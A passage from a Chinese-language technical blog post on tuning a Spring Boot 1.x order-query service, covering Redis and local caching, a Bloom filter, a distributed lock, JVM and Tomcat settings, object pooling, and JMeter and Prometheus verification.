    <span class="hljs-keyword">private</span> TwoLevelCacheManager cacheManager;
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CACHE_KEY_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">"order:query:"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">CACHE_TIMEOUT</span> <span class="hljs-operator">=</span> <span class="hljs-number">30</span>;  <span class="hljs-comment">// 30 分钟</span>
    
    <span class="hljs-keyword">public</span> OrderVO <span class="hljs-title function_">queryOrder</span><span class="hljs-params">(String orderNo)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> CACHE_KEY_PREFIX + orderNo;
        
        <span class="hljs-comment">// 1. 先查缓存</span>
        <span class="hljs-type">OrderVO</span> <span class="hljs-variable">cached</span> <span class="hljs-operator">=</span> cacheManager.get(cacheKey, OrderVO.class);
        <span class="hljs-keyword">if</span> (cached != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> cached;
        }
        
        <span class="hljs-comment">// 2. 缓存未命中，查询数据库</span>
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderMapper.selectByOrderNo(orderNo);
        <span class="hljs-keyword">if</span> (order == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        
        List&lt;OrderItem&gt; items = orderItemMapper.selectByIds(order.getItemIds());
        <span class="hljs-type">OrderDetail</span> <span class="hljs-variable">detail</span> <span class="hljs-operator">=</span> orderDetailMapper.selectByOrderId(order.getId());
        
        <span class="hljs-type">OrderVO</span> <span class="hljs-variable">orderVO</span> <span class="hljs-operator">=</span> buildOrderVO(order, items, detail);
        
        <span class="hljs-comment">// 3. 写入缓存</span>
        cacheManager.put(cacheKey, orderVO, CACHE_TIMEOUT, TimeUnit.MINUTES);
        
        <span class="hljs-keyword">return</span> orderVO;
    }
}
</code></pre>
<h5 data-id="heading-26">第四步：防止缓存穿透和击穿</h5>
<p><strong>缓存穿透：</strong> 查询不存在的数据，每次都穿透到数据库</p>
<p><strong>术语解释：缓存穿透</strong></p>
<ul>
<li><strong>通俗理解：</strong> 用户查询不存在的订单号（如 <code>ORD999999</code>），缓存中没有，每次都绕过缓存查数据库，导致数据库压力增大</li>
<li><strong>解决方案：</strong> 布隆过滤器 + 空值缓存</li>
</ul>
<p><strong>解决方案：布隆过滤器 + 空值缓存</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-comment">// 使用 Guava 的布隆过滤器</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> BloomFilter&lt;String&gt; orderNoBloomFilter = BloomFilter.create(
            Funnels.stringFunnel(Charset.defaultCharset()),
            <span class="hljs-number">100000</span>,  <span class="hljs-comment">// 预期插入数量</span>
            <span class="hljs-number">0.01</span>     <span class="hljs-comment">// 误判率</span>
    );
    
    <span class="hljs-keyword">public</span> OrderVO <span class="hljs-title function_">queryOrder</span><span class="hljs-params">(String orderNo)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> CACHE_KEY_PREFIX + orderNo;
        
        <span class="hljs-comment">// 1. 布隆过滤器判断（核心优化：快速过滤不存在的订单号）</span>
        <span class="hljs-keyword">if</span> (!orderNoBloomFilter.mightContain(orderNo)) {
            <span class="hljs-comment">// 肯定不存在，直接返回 null</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        
        <span class="hljs-comment">// 2. 查缓存</span>
        <span class="hljs-type">OrderVO</span> <span class="hljs-variable">cached</span> <span class="hljs-operator">=</span> cacheManager.get(cacheKey, OrderVO.class);
        <span class="hljs-keyword">if</span> (cached != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// 如果是空值标记，返回 null</span>
            <span class="hljs-keyword">if</span> (cached == NULL_OBJECT) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
            }
            <span class="hljs-keyword">return</span> cached;
        }
        
        <span class="hljs-comment">// 3. 查数据库</span>
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderMapper.selectByOrderNo(orderNo);
        <span class="hljs-keyword">if</span> (order == <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// 缓存空值，防止穿透（设置较短的过期时间）</span>
            cacheManager.put(cacheKey, NULL_OBJECT, <span class="hljs-number">5</span>, TimeUnit.MINUTES);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        
        <span class="hljs-comment">// 4. 构建结果并缓存</span>
        <span class="hljs-type">OrderVO</span> <span class="hljs-variable">orderVO</span> <span class="hljs-operator">=</span> buildOrderVO(order, items, detail);
        cacheManager.put(cacheKey, orderVO, CACHE_TIMEOUT, TimeUnit.MINUTES);
        
        <span class="hljs-comment">// 5. 加入布隆过滤器</span>
        orderNoBloomFilter.put(orderNo);
        
        <span class="hljs-keyword">return</span> orderVO;
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">OrderVO</span> <span class="hljs-variable">NULL_OBJECT</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderVO</span>();  <span class="hljs-comment">// 空值标记</span>
}
</code></pre>
<p><strong>缓存击穿：</strong> 热点 key 过期，大量请求同时访问数据库</p>
<p><strong>术语解释：缓存击穿</strong></p>
<ul>
<li><strong>通俗理解：</strong> 热点订单（如双11爆款商品订单）的缓存过期了，瞬间有 1000 个请求同时查询数据库，导致数据库压力激增</li>
<li><strong>解决方案：</strong> 分布式锁，只允许一个线程查询数据库，其他线程等待</li>
</ul>
<p><strong>解决方案：分布式锁（Redis 实现，健壮版本）</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> TwoLevelCacheManager cacheManager;
    
    <span class="hljs-keyword">public</span> OrderVO <span class="hljs-title function_">queryOrder</span><span class="hljs-params">(String orderNo)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> CACHE_KEY_PREFIX + orderNo;
        
        <span class="hljs-comment">// 1. 先查缓存</span>
        <span class="hljs-type">OrderVO</span> <span class="hljs-variable">cached</span> <span class="hljs-operator">=</span> cacheManager.get(cacheKey, OrderVO.class);
        <span class="hljs-keyword">if</span> (cached != <span class="hljs-literal">null</span> &amp;&amp; cached != NULL_OBJECT) {
            <span class="hljs-keyword">return</span> cached;
        }
        
        <span class="hljs-comment">// 2. 缓存未命中，尝试获取分布式锁</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">lockKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"lock:"</span> + cacheKey;
        <span class="hljs-comment">// ⚠️ 核心优化：使用 UUID 标识锁归属，避免误删其他线程的锁</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">lockValue</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();
        <span class="hljs-type">Boolean</span> <span class="hljs-variable">lockAcquired</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue()
                .setIfAbsent(lockKey, lockValue, <span class="hljs-number">10</span>, TimeUnit.SECONDS);
        
        <span class="hljs-keyword">if</span> (lockAcquired != <span class="hljs-literal">null</span> &amp;&amp; lockAcquired) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 双重检查：再次查缓存（可能其他线程已经写入）</span>
                cached = cacheManager.get(cacheKey, OrderVO.class);
                <span class="hljs-keyword">if</span> (cached != <span class="hljs-literal">null</span> &amp;&amp; cached != NULL_OBJECT) {
                    <span class="hljs-keyword">return</span> cached;
                }
                
                <span class="hljs-comment">// 查询数据库</span>
                <span class="hljs-type">OrderVO</span> <span class="hljs-variable">orderVO</span> <span class="hljs-operator">=</span> queryFromDatabase(orderNo);
                
                <span class="hljs-comment">// 写入缓存</span>
                <span class="hljs-keyword">if</span> (orderVO != <span class="hljs-literal">null</span>) {
                    cacheManager.put(cacheKey, orderVO, CACHE_TIMEOUT, TimeUnit.MINUTES);
                } <span class="hljs-keyword">else</span> {
                    cacheManager.put(cacheKey, NULL_OBJECT, <span class="hljs-number">5</span>, TimeUnit.MINUTES);
                }
                
                <span class="hljs-keyword">return</span> orderVO;
            } <span class="hljs-keyword">finally</span> {
                <span class="hljs-comment">// ⚠️ 核心优化：释放锁时校验归属，避免误删其他线程的锁</span>
                <span class="hljs-type">String</span> <span class="hljs-variable">currentLockValue</span> <span class="hljs-operator">=</span> (String) redisTemplate.opsForValue().get(lockKey);
                <span class="hljs-keyword">if</span> (lockValue.equals(currentLockValue)) {
                    redisTemplate.delete(lockKey);
                }
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 获取锁失败，等待一小段时间后重试</span>
            <span class="hljs-keyword">try</span> {
                Thread.sleep(<span class="hljs-number">50</span>);
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            <span class="hljs-keyword">return</span> queryOrder(orderNo);  <span class="hljs-comment">// 递归重试</span>
        }
    }
}
</code></pre>
<p><strong>补充说明：</strong></p>
<ul>
<li><strong>原生 Redis 锁适合中小流量（QPS &lt; 5000）</strong>，高并发场景建议使用 Redisson 1.x 版本（支持自动续期、可重入锁等高级特性）</li>
<li><strong>Redisson 1.x 兼容 Spring Boot 1.x：</strong> <code>redisson-spring-boot-starter</code> 3.8.2 版本</li>
</ul>
<h5 data-id="heading-27">第五步：缓存更新策略</h5>
<p><strong>问题：</strong> 订单数据变更后（如修改订单状态），缓存未失效，导致脏数据</p>
<p><strong>解决方案：</strong> 在数据更新时同步失效缓存</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> TwoLevelCacheManager cacheManager;
    
    <span class="hljs-comment">/**
     * 更新订单状态（需同步失效缓存）
     */</span>
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateOrderStatus</span><span class="hljs-params">(String orderNo, Integer status)</span> {
        <span class="hljs-comment">// 1. 更新数据库</span>
        orderMapper.updateStatus(orderNo, status);
        
        <span class="hljs-comment">// 2. 失效缓存（核心优化：缓存更新需与事务同步）</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> CACHE_KEY_PREFIX + orderNo;
        cacheManager.evict(cacheKey);
    }
}
</code></pre>
<p><strong>补充说明：</strong> 缓存更新需与事务同步，避免更新后缓存未失效导致脏数据。如果使用 <code>@Transactional</code>，建议在事务提交后失效缓存（使用 <code>@TransactionalEventListener</code> 监听事务提交事件）。</p>
<p><strong>缓存层优化总结：</strong></p>
<ul>
<li>响应时间：600ms → 150ms（缓存命中时 &lt; 10ms）</li>
<li>缓存命中率：85%</li>
<li><strong>提升：75%</strong></li>
</ul>
<hr/>
<h4 data-id="heading-28">3.3 ✅ JVM 与容器调优：基础但关键</h4>
<h5 data-id="heading-29">问题：默认 JVM 参数不合理</h5>
<p><strong>问题原因：</strong>
Spring Boot 1.x 默认的 JVM 参数比较保守，不适合生产环境：</p>
<ul>
<li>堆内存默认只有 512MB（通过 <code>-Xmx</code> 设置）</li>
<li>使用串行 GC（<code>-XX:+UseSerialGC</code>），GC 停顿时间长</li>
<li>没有设置新生代大小，导致频繁 Full GC</li>
</ul>
<h5 data-id="heading-30">解决方案：优化 JVM 参数</h5>
<p><strong>启动脚本优化（<code>start.sh</code>）：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-comment"># ⚠️ 场景化配置说明：</span>
<span class="hljs-comment"># -Xms2g -Xmx2g：适用于 4 核 8G 服务器</span>
<span class="hljs-comment"># 2 核 4G 服务器建议调整为：-Xms1g -Xmx1g</span>
<span class="hljs-comment"># 8 核 16G 服务器可调整为：-Xms4g -Xmx4g</span>

JAVA_OPTS=<span class="hljs-string">"-server \
  -Xms2g \
  -Xmx2g \
  -XX:NewRatio=2 \
  -XX:SurvivorRatio=8 \
  -XX:+UseParallelGC \
  -XX:ParallelGCThreads=4 \
  -XX:MaxGCPauseMillis=200 \
  -XX:+HeapDumpOnOutOfMemoryError \
  -XX:HeapDumpPath=/var/log/heapdump.hprof \
  -XX:+PrintGCDetails \
  -XX:+PrintGCDateStamps \
  -Xloggc:/var/log/gc.log \
  -XX:+UseGCLogFileRotation \
  -XX:NumberOfGCLogFiles=5 \
  -XX:GCLogFileSize=20M"</span>

java <span class="hljs-variable">$JAVA_OPTS</span> -jar app.jar
</code></pre>
<p><strong>参数说明：</strong></p>
<ul>
<li><code>-Xms2g -Xmx2g</code>：堆内存初始值和最大值都是 2GB（避免动态扩容）
<ul>
<li><strong>场景化说明：</strong> 适用于 4 核 8G 服务器，2 核 4G 服务器建议调整为 <code>-Xms1g -Xmx1g</code></li>
</ul>
</li>
<li><code>-XX:NewRatio=2</code>：新生代与老年代比例 1:2（新生代占 1/3）</li>
<li><code>-XX:SurvivorRatio=8</code>：Eden 区与 Survivor 区比例 8:1</li>
<li><code>-XX:+UseParallelGC</code>：使用并行 GC（适合 Spring Boot 1.x，比串行 GC 快）</li>
<li><code>-XX:MaxGCPauseMillis=200</code>：最大 GC 停顿时间 200ms（<strong>注意：这是目标停顿时间，非强制值</strong>）</li>
</ul>
<p><strong>补充说明：</strong></p>
<ul>
<li><strong>JDK 8u20+ 可尝试 G1 GC（<code>-XX:+UseG1GC</code>）</strong>，但需测试稳定性，Spring Boot 1.x 项目谨慎使用</li>
<li><strong>G1 GC 参数示例（仅供参考，需压测验证）：</strong>
<pre><code class="hljs language-bash" lang="bash">-XX:+UseG1GC \
-XX:MaxGCPauseMillis=200 \
-XX:G1HeapRegionSize=16m
</code></pre>
</li>
</ul>
<h5 data-id="heading-31">Tomcat 线程池优化</h5>
<p>Spring Boot 1.x 内置的是 Tomcat 8，线程池配置在 <code>application.properties</code>：</p>
<pre><code class="hljs language-properties" lang="properties"># Tomcat 线程池配置
server.tomcat.max-threads=200
server.tomcat.min-spare-threads=20
server.tomcat.accept-count=100
server.tomcat.max-connections=10000
server.tomcat.connection-timeout=20000

# ⚠️ 线程池配置说明：
# max-threads 建议值：
# - CPU 密集型：max-threads = (CPU 核心数 * 2) + 1
#   比如 4 核 CPU，建议设置为 9-20 之间
# - IO 密集型：max-threads = (CPU 核心数 * 10)
#   比如 4 核 CPU，建议设置为 40-80 之间
# 注意：不要设置太大，否则会导致 OOM
</code></pre>
<p><strong>参数说明：</strong></p>
<ul>
<li><code>max-threads=200</code>：最大工作线程数（根据服务器配置调整，不要盲目设大）</li>
<li><code>min-spare-threads=20</code>：最小空闲线程数</li>
<li><code>accept-count=100</code>：等待队列长度（超过这个数会拒绝连接）</li>
<li><code>max-connections=10000</code>：最大连接数</li>
</ul>
<p><strong>踩坑提醒：</strong> 我之前把 <code>max-threads</code> 设成了 1000，结果服务器直接 OOM 了。后来才知道，线程数太多会导致上下文切换开销增大，反而降低性能。</p>
<h5 data-id="heading-32">效果对比</h5>
<p><strong>GC 统计（优化后）：</strong></p>
<pre><code class="hljs language-diff" lang="diff">GC 统计（优化后）：
<span class="hljs-deletion">- Young GC 频率: 每 30 秒 1 次（优化前：每 10 秒 1 次）</span>
<span class="hljs-deletion">- Full GC 频率: 每 10 分钟 1 次（优化前：每 2 分钟 1 次）</span>
<span class="hljs-deletion">- Full GC 平均耗时: 200ms（优化前：800ms）</span>
<span class="hljs-deletion">- 堆内存使用率: 60%（优化前：85%）</span>
</code></pre>
<p><strong>JVM 与容器调优总结：</strong></p>
<ul>
<li>Full GC 频率降低 80%</li>
<li>Full GC 耗时降低 75%</li>
<li><strong>整体响应时间提升：15-20%</strong></li>
</ul>
<hr/>
<h4 data-id="heading-33">3.4 代码与框架调优：细节决定成败</h4>
<h5 data-id="heading-34">问题 1：对象频繁创建</h5>
<p><strong>问题原因：</strong>
在循环中频繁创建对象，导致 GC 压力大：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 优化前：每次循环都创建新对象</span>
<span class="hljs-keyword">public</span> List&lt;OrderVO&gt; <span class="hljs-title function_">queryOrders</span><span class="hljs-params">(List&lt;String&gt; orderNos)</span> {
    List&lt;OrderVO&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (String orderNo : orderNos) {
        <span class="hljs-type">OrderVO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderVO</span>();  <span class="hljs-comment">// 频繁创建对象</span>
        <span class="hljs-comment">// ... 设置属性</span>
        result.add(vo);
    }
    <span class="hljs-keyword">return</span> result;
}
</code></pre>
<p><strong>解决方案：使用对象池（Commons Pool 2）</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- pom.xml --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-pool2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderVOPool</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> GenericObjectPool&lt;OrderVO&gt; pool;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderVOPool</span><span class="hljs-params">()</span> {
        PooledObjectFactory&lt;OrderVO&gt; factory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BasePooledObjectFactory</span>&lt;OrderVO&gt;() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> OrderVO <span class="hljs-title function_">create</span><span class="hljs-params">()</span> {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderVO</span>();
            }
            
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> PooledObject&lt;OrderVO&gt; <span class="hljs-title function_">wrap</span><span class="hljs-params">(OrderVO obj)</span> {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultPooledObject</span>&lt;&gt;(obj);
            }
            
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">passivateObject</span><span class="hljs-params">(PooledObject&lt;OrderVO&gt; p)</span> {
                <span class="hljs-comment">// 重置对象状态</span>
                <span class="hljs-type">OrderVO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> p.getObject();
                vo.setId(<span class="hljs-literal">null</span>);
                vo.setOrderNo(<span class="hljs-literal">null</span>);
                <span class="hljs-comment">// ... 重置其他字段</span>
            }
        };
        
        GenericObjectPoolConfig&lt;OrderVO&gt; config = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericObjectPoolConfig</span>&lt;&gt;();
        config.setMaxTotal(<span class="hljs-number">100</span>);
        config.setMaxIdle(<span class="hljs-number">20</span>);
        config.setMinIdle(<span class="hljs-number">5</span>);
        
        <span class="hljs-built_in">this</span>.pool = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericObjectPool</span>&lt;&gt;(factory, config);
    }
    
    <span class="hljs-keyword">public</span> OrderVO <span class="hljs-title function_">borrowObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">return</span> pool.borrowObject();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">returnObject</span><span class="hljs-params">(OrderVO obj)</span> {
        pool.returnObject(obj);
    }
}
</code></pre>
<p><strong>使用对象池：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderVOPool orderVOPool;
    
    <span class="hljs-keyword">public</span> List&lt;OrderVO&gt; <span class="hljs-title function_">queryOrders</span><span class="hljs-params">(List&lt;String&gt; orderNos)</span> {
        List&lt;OrderVO&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-keyword">for</span> (String orderNo : orderNos) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">OrderVO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> orderVOPool.borrowObject();  <span class="hljs-comment">// 从对象池获取</span>
                <span class="hljs-comment">// ... 设置属性</span>
                result.add(vo);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                <span class="hljs-comment">// 如果对象池获取失败，创建新对象</span>
                result.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderVO</span>());
            }
        }
        <span class="hljs-keyword">return</span> result;
    }
}
</code></pre>
<p><strong>注意：</strong> 对象池适合频繁创建、生命周期短的对象。对于简单对象（如 String、Integer），对象池的开销可能大于直接创建，不建议使用。</p>
<h5 data-id="heading-35">问题 2：Spring Bean 作用域不合理</h5>
<p><strong>问题原因：</strong>
有些 Service 使用了默认的单例模式，但内部有状态，导致线程安全问题：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 问题代码：单例 Bean 但有状态</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    <span class="hljs-keyword">private</span> OrderVO currentOrder;  <span class="hljs-comment">// 有状态，线程不安全！</span>
    
    <span class="hljs-keyword">public</span> OrderVO <span class="hljs-title function_">queryOrder</span><span class="hljs-params">(String orderNo)</span> {
        currentOrder = orderMapper.selectByOrderNo(orderNo);  <span class="hljs-comment">// 多线程并发会覆盖</span>
        <span class="hljs-keyword">return</span> currentOrder;
    }
}
</code></pre>
<p><strong>解决方案：</strong></p>
<ol>
<li><strong>无状态 Bean 用单例（默认）</strong></li>
<li><strong>有状态 Bean 用原型模式（<code>@Scope("prototype")</code>）</strong></li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 优化后：无状态设计</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    <span class="hljs-comment">// 移除有状态字段，所有方法都是无状态的</span>
    
    <span class="hljs-keyword">public</span> OrderVO <span class="hljs-title function_">queryOrder</span><span class="hljs-params">(String orderNo)</span> {
        <span class="hljs-type">OrderVO</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderMapper.selectByOrderNo(orderNo);  <span class="hljs-comment">// 局部变量，线程安全</span>
        <span class="hljs-keyword">return</span> order;
    }
}
</code></pre>
<h5 data-id="heading-36">问题 3：懒加载优化</h5>
<p><strong>问题原因：</strong>
Spring Boot 启动时，所有单例 Bean 都会立即初始化，导致启动慢：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 优化前：启动时就初始化</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HeavyService</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HeavyService</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 初始化耗时操作</span>
        initHeavyResource();  <span class="hljs-comment">// 耗时 5 秒</span>
    }
}
</code></pre>
<p><strong>解决方案：使用 <code>@Lazy</code> 注解</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 优化后：延迟初始化</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Lazy</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HeavyService</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HeavyService</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 只有在第一次使用时才初始化</span>
        initHeavyResource();
    }
}
</code></pre>
<p><strong>代码与框架调优总结：</strong></p>
<ul>
<li>对象创建开销降低 30%</li>
<li>启动时间减少 20%</li>
<li><strong>整体响应时间提升：10-15%</strong></li>
</ul>
<hr/>
<h3 data-id="heading-37">四、效果验证：数据说话</h3>
<h4 data-id="heading-38">4.1 优化前后对比</h4>
<p>经过 3 天的调优，最终的性能数据如下：</p>

































































<table><thead><tr><th>指标</th><th>优化前</th><th>优化后</th><th>提升幅度</th></tr></thead><tbody><tr><td><strong>平均响应时间</strong></td><td>3000ms</td><td>180ms</td><td><strong>优化后较优化前降低 94%</strong></td></tr><tr><td><strong>P50 响应时间</strong></td><td>2800ms</td><td>150ms</td><td><strong>优化后较优化前降低 94.6%</strong></td></tr><tr><td><strong>P95 响应时间</strong></td><td>5000ms</td><td>250ms</td><td><strong>优化后较优化前降低 95%</strong></td></tr><tr><td><strong>P99 响应时间</strong></td><td>8000ms</td><td>350ms</td><td><strong>优化后较优化前降低 95.6%</strong></td></tr><tr><td><strong>QPS</strong></td><td>100</td><td>1000</td><td><strong>优化后较优化前提升 900%</strong></td></tr><tr><td><strong>错误率</strong></td><td>5%</td><td>0.1%</td><td><strong>优化后较优化前降低 98%</strong></td></tr><tr><td><strong>CPU 使用率</strong></td><td>85%</td><td>45%</td><td><strong>优化后较优化前降低 47%</strong></td></tr><tr><td><strong>内存使用率</strong></td><td>85%</td><td>60%</td><td><strong>优化后较优化前降低 29%</strong></td></tr><tr><td><strong>Full GC 频率</strong></td><td>每 2 分钟</td><td>每 10 分钟</td><td><strong>优化后较优化前降低 80%</strong></td></tr></tbody></table>
<h4 data-id="heading-39">4.2 压测验证（JMeter）</h4>
<p><strong>压测配置：</strong></p>
<ul>
<li>线程数：200</li>
<li>循环次数：1000</li>
<li>接口：<code>GET /api/order/query?orderNo=ORD20240101001</code></li>
</ul>
<p><strong>JMeter 压测计划配置（关键步骤）：</strong></p>
<ol>
<li>
<p><strong>创建线程组：</strong></p>
<ul>
<li>线程数：200</li>
<li>Ramp-up 时间：10 秒（逐步增加并发）</li>
<li>循环次数：1000</li>
</ul>
</li>
<li>
<p><strong>创建 HTTP 请求：</strong></p>
<ul>
<li>协议：http</li>
<li>服务器名称：localhost</li>
<li>端口：8080</li>
<li>路径：/api/order/query</li>
<li>参数：orderNo=ORD20240101001</li>
</ul>
</li>
<li>
<p><strong>添加聚合报告：</strong></p>
<ul>
<li>查看平均响应时间、最大响应时间、错误率等指标</li>
</ul>
</li>
</ol>
<p><strong>压测结果：</strong></p>
<pre><code class="hljs language-diff" lang="diff">优化前：
<span class="hljs-deletion">- 总请求数：200,000</span>
<span class="hljs-deletion">- 成功请求：190,000（95%）</span>
<span class="hljs-deletion">- 平均响应时间：2850ms</span>
<span class="hljs-deletion">- 最大响应时间：12000ms</span>
<span class="hljs-deletion">- 错误率：5%</span>

优化后：
<span class="hljs-deletion">- 总请求数：200,000</span>
<span class="hljs-deletion">- 成功请求：199,800（99.9%）</span>
<span class="hljs-deletion">- 平均响应时间：175ms</span>
<span class="hljs-deletion">- 最大响应时间：450ms</span>
<span class="hljs-deletion">- 错误率：0.1%</span>
</code></pre>
<p><strong>如何通过压测验证优化效果：</strong></p>
<ol>
<li>对比优化前后的平均响应时间、P95/P99 响应时间</li>
<li>观察错误率是否降低</li>
<li>监控服务器 CPU、内存使用率是否降低</li>
<li>检查数据库连接池是否还有等待连接的情况</li>
</ol>
<h4 data-id="heading-40">4.3 线上监控（Grafana + Prometheus）</h4>
<p>Spring Boot 1.x 集成 Prometheus 需要额外配置：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- pom.xml --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.micrometer<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>micrometer-registry-prometheus<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.9<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 兼容 Spring Boot 1.x 的版本 --&gt;</span>
